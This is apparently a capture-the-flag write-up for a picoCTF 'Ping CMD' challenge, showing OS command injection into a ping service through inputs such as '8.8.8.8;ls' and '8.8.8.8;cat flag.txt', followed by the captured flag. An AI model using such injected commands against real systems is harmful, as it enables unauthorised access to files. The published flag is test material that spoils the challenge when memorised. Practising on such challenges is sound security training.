# Ping CMD

![image.png](images/image.png)

The instance allow us to ping `8.8.8.8` (Google DNS)

```python
└─$  nc mysterious-sea.picoctf.net <port>
Enter an IP address to ping! (We have tight security because we only allow '8.8.8.8'): 8.8.8.8
PING 8.8.8.8 (8.8.8.8) 56(84) bytes of data.
64 bytes from 8.8.8.8: icmp_seq=1 ttl=111 time=9.51 ms
64 bytes from 8.8.8.8: icmp_seq=2 ttl=111 time=9.47 ms

--- 8.8.8.8 ping statistics ---
2 packets transmitted, 2 received, 0% packet loss, time 1002ms
rtt min/avg/max/mdev = 9.471/9.492/9.513/0.021 ms
```

However, what if we inject a command after it? it seems we are able to do so by adding `;<command>`, revealing `flag.txt`

```python
└─$  nc mysterious-sea.picoctf.net <port>
Enter an IP address to ping! (We have tight security because we only allow '8.8.8.8'): 8.8.8.8;ls
PING 8.8.8.8 (8.8.8.8) 56(84) bytes of data.
64 bytes from 8.8.8.8: icmp_seq=1 ttl=111 time=9.51 ms
64 bytes from 8.8.8.8: icmp_seq=2 ttl=111 time=9.50 ms

--- 8.8.8.8 ping statistics ---
2 packets transmitted, 2 received, 0% packet loss, time 1001ms
rtt min/avg/max/mdev = 9.498/9.505/9.512/0.007 ms
flag.txt
script.sh

```

With this, we can cat the flag

```python
└─$  nc mysterious-sea.picoctf.net <port>
Enter an IP address to ping! (We have tight security because we only allow '8.8.8.8'): 8.8.8.8;cat flag.txt
PING 8.8.8.8 (8.8.8.8) 56(84) bytes of data.
64 bytes from 8.8.8.8: icmp_seq=1 ttl=111 time=9.48 ms
64 bytes from 8.8.8.8: icmp_seq=2 ttl=111 time=9.48 ms

--- 8.8.8.8 ping statistics ---
2 packets transmitted, 2 received, 0% packet loss, time 1002ms
rtt min/avg/max/mdev = 9.475/9.476/9.478/0.001 ms
picoCTF{p1nG_c0mm@nd_3xpL0it_su33essFuL_b75fc848}
```

Flag: `picoCTF{p1nG_c0mm@nd_3xpL0it_su33essFuL_b75fc848}`
